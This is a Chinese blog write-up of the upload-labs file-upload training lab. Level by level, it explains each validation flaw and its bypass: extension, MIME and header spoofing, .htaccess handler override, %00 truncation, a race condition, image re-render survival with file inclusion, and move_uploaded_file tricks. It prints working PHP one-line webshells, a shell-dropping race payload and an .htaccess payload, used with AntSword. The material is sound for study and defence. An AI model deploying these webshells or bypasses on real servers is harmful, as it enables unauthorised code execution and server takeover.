---
title: "Upload Labs靶场"
date: 2024-05-06T22:39:37+08:00
image: https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052319298.jpg
categories: ["靶场"]
---

## 前言

重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。

## 搭建

这里我使用的是一位大佬自己搭建的upload靶场，不过知识点还是一样的。[GitHub - sqlsec/upload-labs-docker: 国光的文件上传靶场，基于 upload-labs 定制](https://github.com/sqlsec/upload-labs-docker)

下载他的压缩包后，解压用docker搭建即可。

如果用的最新版docker的话，起镜像的名令为

```shell
docker compose up -d
```

## upload_1 [JS]

![image-20240401223158086](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240401223158086.png)

### 漏洞分析

这关漏洞在于它只进行前端验证。右键查看源代码

![image-20240401223352105](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012233163.png)

可以看到这段js代码的作用就是对上传的文件进行判断和过滤。

就是我们只有在上传`.jpg .png .gif .jpeg`后缀文件时，才能上传成功。

但是它只进行了前端验证，所以只要上传一个符合条件的文件，在前端验证完把文件放走后用bp抓包，在它即将把数据发送给后端时，将文件名修改为`.php`文件，就能成功上传该木马。

### 解决方法

我们先创建一个一句话木马文件，内容如下

```php
<?php
@eval($_POST[1]);
?>
```

将其后缀改为`.jpg`，上传并用burpsuite抓包，抓到的数据如下

![image-20240401224335199](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012243256.png)

然后将文件后缀改为`.php`，并放包

![image-20240401224448171](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012244266.png)

这个就是我们上传的文件了，然后我们右键它复制链接

找到上传的地址了，接下来用蚁剑连接

![image-20240401224804758](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404012248818.png)

出现这个绿标就宣告我们成功了

## upload-2 [.htaccess]

![image-20240402201003074](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022010190.png)

### 漏洞分析

这个靶场带有源码，所以就用源码来讲解，如果是实际情况，那肯定是不能看到的，只能自己去一个一个尝试。

![image-20240402200657153](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022007333.png)

这个黑名单就是这段代码的关键点，可以看到它过滤了很多可执行文件，并且因为这个并不是上一关的js前端审核，我们无法通过抓包改后缀的方法去绕过。

那么这关的思路就是它在页面上的提示了`.htaccess`文件。

```
.htaccess是一个用于配置Apache HTTP服务器的文件。它通常位于网站的根目录或特定目录下，通过在文件中编写一些规则和指令，可以对该目录或其子目录的行为进行自定义设置。它允许您在不修改服务器配置文件的情况下，对特定目录或网站的行为进行修改。可以在.htaccess文件中添加各种指令，例如重定向规则、访问控制、错误页面定义、缓存控制等。
```

这个黑名单是没有过滤这个后缀的，所以就可以上传`.htaccess`文件，它里面的内容就写成

```php
<FilesMatch ".jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

```
这段代码是一个Apache HTTP服务器的配置，用于将对以".jpg"结尾的URL请求的处理器设置为PHP解析器。当Apache服务器收到以".jpg"结尾的请求时，它会将请求交给PHP解析器来处理，而不是将其作为静态图片文件返回。
在这段配置中，<FilesMatch>标签用于匹配特定的文件名模式，这里是匹配以".jpg"结尾的文件。SetHandler指令用于设置与匹配的文件相关联的处理器，这里是将处理器设置为application/x-httpd-php，即PHP解析器。
```

起到的作用就是，我们上传的`.jpg`文件，会被自动当作`.php`文件进行执行。

### 解决方法

首先创建一个`.htaccess`文件，在里面写入上面说的内容，然后上传

![image-20240402202143725](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022021780.png)

可以看到我们上传成功了，接着把一句话木马的后缀改为`.jpg`，直接上传

接下来就用蚁剑连接

![image-20240402202323857](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022023920.png)

连接成功，而且可以看到我们连接的文件后缀还是`.jpg`

## upload-3 [MIME]

![image-20240402204405883](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022044958.png)

### 漏洞分析

我们先介绍一下MIME

```
MIME（Multipurpose Internet Mail Extensions）是一种标准，用于标识互联网上不同类型的文件和媒体内容。MIME类型由两部分组成：主类型（top-level type）和子类型（sub-type），用斜杠分隔。例如，`text/html`和`image/jpeg`都是MIME类型。
MIME类型用于指示文件或数据的性质和格式，以便客户端和服务器可以正确地处理和解释内容。它在HTTP协议中的`Content-Type`头部字段中使用。
```

这关没有源码可看，但对上传文件还是进行了限制。需要测试什么文件类型可以上传，然后我们再上传木马文件，并将其的`MIME`类型修改为可以上传的类型。

### 解决方法

我们先上传`.jpg`文件，并抓包看看数据

![image-20240402205432030](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022054068.png)

发现这个文件类型可以成功上传，接着我们可以把文件后缀改为`.php`文件，继续上传发现依然能上传成功。但是如果我们一开始就上传`.php`文件，就会发现无法上传，因为上传`.php`文件后`content-type`的值就会变成

```
Content-Type: application/x-php
```

这个文件类型是不能上传成功的类型，接着直接蚁剑连接

![image-20240402205851767](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404022058835.png)

成功

## upload-4 [文件头]

![image-20240405225727311](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052257430.png)

### 漏洞分析

这关有源码，所有就可以看源码进行分析。

![image-20240405230050325](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052300382.png)

这就是关键的部分，可以看到有两个白名单，第一个就是上一关讲到的`MIME`类型，这个绕过的方法就不再讲述了。

第二个就是检测你的文件头，看你的文件头是否和`.gif .jpg .png`文件的文件头一致，而我们只需要在代码前面加上相应的文件头字符串即可。常用的就是`GIF89a`

### 解决方法

先上传一句话木马文件，然后抓包

![image-20240405230904356](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052309393.png)

这两处就是我们需要修改的部分，改为

![image-20240405230937962](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404052309993.png)

然后发包，即可上传成功，接着就可以蚁剑连接。

## upload-5 [代码缺陷1]

![image-20240406215153374](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062152525.png)

### 漏洞分析

有缺陷的代码，已经在界面上展示了，所以就直接分析这三句代码即可。可以看到它还是设了一个黑名单，不过它与前几关的不同点是它并没有禁止这些文件上传，而是修改这些文件的名称。比如上传了一个`1.php`的文件，它依然可以上传成功，但是我们会搜不到这个文件。因为该文件名称中有`php`这段字符串，所以就会把它替换为空字符，文件名就变成了`1`。

所以我们的绕过方法就是用字符拼接进行绕过。比如上传`1.pphphp`

它会检测到`php`这段字符串，但是就算把它替换为空字符了,我们的文件依然是`php`文件

```
1.pphphp  --> 1.php
```

### 解决方法

把木马文件的后缀改为`.pphphp`，然后上传

![image-20240406223503248](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062235289.png)

然后就会发现上传的文件依然是`.php`文件

![image-20240406223542775](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062235805.png)

接着用蚁剑连接即可

## upload-6 [代码缺陷2]

![image-20240406224023499](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062240573.png)

### 漏洞分析

这个问题代码其实和上关差不多，但是它是把黑民单的字符改为了空格符，这就导致字符复写的方法用不了了，但是它提示我们用的系统是Windows系统，在Windows系统中是区分大小写的，所以就可以通过大小写进行绕过。linux系统是不区分大小写的，所以大小写绕过的方法是无法成功的。

### 解决方法

将后缀改为`.PHp`，然后上传

![image-20240406224552352](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404062245383.png)

文件后缀没有改变。

## upload-7 [GET型%00截断]

![image-20240409221930797](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404092219938.png)

### 漏洞分析

这是上传部分的代码。

![image-20240409222418782](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404092224839.png)

这个方法页面也给出了，接下来就讲解一下`%00`截断的原理。`%00`其实就是十六进制的`\x00`它们对应的ascii码值是`0`,但是它所表示的并不只是一个数字`0`，这是网上搜到的解释

![image-20240411180901972](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404111809055.png)

也就是说它还表示`NULL`和空字符，在低版本PHP中空字符表示着一行代码的结束。

```
upload/1.php%001.png		-->			1.php
```

如果get传参是这样的数据，最后会被认为是`1.php`文件，而后面的`1.png`就会被省略。%00截断的原理大概就是这样了。但为什么使用`%00`可以绕过这个文件上传呢。这就要分析代码。

![image-20240411181726217](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404111817267.png)

这是我们上传并抓包得到的数据。我们上传一个`jpg`文件，来通过白名单。之后存储文件的时候

```php
$des = $_GET['road'] . "/" . $filename;
```

这里的`road=../upload/1.php%004535524.jpg`，`%00`后面的被省略了，就导致我们上传的是`1.php`文件，而`1.jpg`文件中的内容也会被写入`1.php`文件内，通过这中方法就上传了一个木马文件。

## upload-9 [黑名单缺陷]

![image-20240407133233215](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071332353.png)

### 漏洞分析

这关的问题主页已经提到了，就是在设置黑名单的时候，忽略了其他文件，导致那些文件正好也可以被执行。比如在apache服务器中，除了`.php`文件会被作为php文件执行，还有

```
phtml  php5  php3  php4  pht  phps  php3p
```

所以就可以把木马文件的后缀改为它们中的一个，依然可以上传成功。

### 解决方法

![image-20240407133737711](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071337747.png)

将文件后缀改为`phtml`，然后上传。上传成功后用蚁剑连接

![image-20240407133848629](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/202404071338699.png)

连接成功

## upload-10 [条件竞争]

![image-20240416214311775](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052323010.png)

### 漏洞分析

​	直接看代码，可以看到文件先会被成功上传，然后才会根据白名单，进行修改文件名或者删除文件，所以如果我们能在程序在改变文件之前访问文件，就能成功执行该木马文件。但因为它只能存在一会儿，所以木马的内容需要修改

```php
<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?>');?>
```

这段代码意思就是在当前目录下创建一个名为`xiao.php`的一句话木马，只要我们执行了文件，就能成功写入一句话木马。

### 解决方法

上传文件，然后用bp抓包

![image-20240416215136258](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162151382.png)

右键选择intruder，选择`Null payloads`

![image-20240416215230400](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162152446.png)

然后我们访问它即将上传的网站路径，再次抓包，然后如上的操作，之后点击`开始攻击`

![image-20240416215554681](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162155784.png)

右边爆破的长度出现变化，说明执行成功了，接下来就可以访问到`xiao.php`文件，用蚁剑成功连接

![image-20240416220400098](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404162204179.png)

## upload-11 [二次渲染]

![image-20240417125525098](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171255256.png)

### 漏洞分析

这里的关键就在于`imagecreatefromxxx`这个函数，它会把我们上传的图片文件进行一次渲染，导致的结果就是图片中的二进制数据可能会发生改变，也就是我们上传的图片码会被渲染成一张普通图片，里面用于执行的代码可能会被修改删除。但是我们依然有绕过的办法，就如该页面所给出的提示。

#### gif

准备一张gif图

![16036176592096](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171301431.gif)

我们把它上传上去，然后将渲染后的图片保存到本地，接着将两张图片放入`010editor`进行比较

![image-20240417130859733](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171308824.png)

灰色的部分就是没有发生变化的部分，所以我们可以把代码写入灰色部分。

![image-20240417131112261](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171311294.png)

然后再次将它上传，将渲染后的gif图保存到本地

![image-20240417131251883](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171312924.png)

可以看到payload没有被删除，个人感觉gif是最简单的。

#### jpg

#### png

这两个都需要脚本进行修改，人比较懒后面再进行补充

### 解决方法

上面的方法是我们如何将payload成功填入文件，并上传，但上传后该怎么使用呢。其实可以注意到这关的网址和之前是有一点区别的

```url
http://ip:30011/?file=hint.html
```

多了一个`file`参数，在没有看源码时可以猜测，这里可能存在文件包含漏洞，我们传入`/etc/passwd`

![image-20240417132135781](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171321855.png)

确实存在文件包含漏洞，所以我们只要包含上传图片的路径，就能执行里面的payload了，然后用蚁剑连接

![image-20240417132943523](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202404171329587.png)

## upload-12 [move_uploaded_file缺陷]

![image-20240504201309426](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405042013577.png)

### 漏洞分析

这里要用到`move_uploaded_file`函数的一个缺陷。当我们能能控制`$img_path`的值时，如果我们输入`1.php/.`，该函数会将其判断为`1.php`，但是由于我们在上传时文件名是`1.php/.`，所以可以绕过黑名单

### 解决方法

![image-20240504222802519](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405042228585.png)

然后访问

![image-20240504222822988](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405042228071.png)

可以看到文件成功上传

## upload-13 [代码审计]

![image-20240505223402538](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052234676.png)

### 漏洞分析

既然这里说到了要代码审计，那就直接查看代码，这就是关键代码

```php
    <?php
        header("Content-type: text/html;charset=utf-8");
        error_reporting(0);
        //设置上传目录
        define("UPLOAD_PATH", dirname(__FILE__) . "/upload/");
        define("UPLOAD_URL_PATH", str_replace($_SERVER['DOCUMENT_ROOT'], "", UPLOAD_PATH));
        if (!file_exists(UPLOAD_PATH)) {
            mkdir(UPLOAD_PATH, 0755);
        }
        $is_upload = false;
        if (!empty($_POST['submit'])) {
            $allow_type = array('image/jpeg','image/png','image/gif');
            if(!in_array($_FILES['upload_file']['type'],$allow_type)){
                echo "<script>black();</script>";
            } else {
                $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
                if (!is_array($file)) {
                    $file = explode('.', strtolower($file));
                }
                
                $ext = end($file);
                $allow_suffix = array('jpg','png','gif');
                
                if (!in_array($ext, $allow_suffix)) {
                    echo "<script>black();</script>";
                } else {
                    $file_name = reset($file) . '.' . $file[count($file) - 1];
                    $temp_file = $_FILES['upload_file']['tmp_name'];
                    $img_path = UPLOAD_PATH . '/' .$file_name;
                    if (move_uploaded_file($temp_file, $img_path)) {
                        $is_upload = true;
                    } else {
                        echo "<script>error();</script>";
                    }
                }
            }
        }
    ?>
```

```php
        if (!empty($_POST['submit'])) {
            $allow_type = array('image/jpeg','image/png','image/gif');
            if(!in_array($_FILES['upload_file']['type'],$allow_type)){
                echo "<script>black();</script>";
            } else {
```

这里就是检测你的文件类型，文件类型需要符合这个白名单才能进行下一步。绕过方法之前也用到过

```php
                $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
                if (!is_array($file)) {
                    $file = explode('.', strtolower($file));
                }
```

这里就是获取上传文件名，如果参数`save_name`里面有值，就会把它的值赋给`$file`，可以发现在上传文件的时候`save_name`是可控的，这里就是这关的突破口。接下来是判断`$file`是不是数组类型，不是就会以`.`为分界创建数组。比如上传的是`1.jpg`经过这段语句就会变成`array["1","jpg"]`

```php
                $ext = end($file);
                $allow_suffix = array('jpg','png','gif');
                
                if (!in_array($ext, $allow_suffix)) {
                    echo "<script>black();</script>";
```

取数组`$file` 的最后一位，也就是后缀名，进行判断查看是否在白名单之内

```php
                } else {
                    $file_name = reset($file) . '.' . $file[count($file) - 1];
                    $temp_file = $_FILES['upload_file']['tmp_name'];
                    $img_path = UPLOAD_PATH . '/' .$file_name;
                    if (move_uploaded_file($temp_file, $img_path)) {
                        $is_upload = true;
                    } else {
                        echo "<script>error();</script>";
                    }
```

这里定义就是文件上传后的命名以及存储位置。比如`$file=array['1','jpg']` ，上传后的文件名就是`1.jpg`

接下来就是该如何通过这关，我们的突破口就在`save_name`中，我们传入`save_name[0]=shell.php/      save_name[2]=png`在检测后缀时，因为该数组最后一位是`png`所以可以绕过。在存储文件时我们存储文件名就会变成`shell.php/.`，因为用到了`move_uploaded_file`函数缺陷，我们仍然上传了`shell.php`。

#### 注

这里为什么要传`save_name[2]`,因为`$file[count($file) - 1]  ==   $file[2-1]`而我们`$file[1]`是一个空值。

### 解决方法

![image-20240505230447057](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052304172.png)

![image-20240505230529319](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405052305389.png)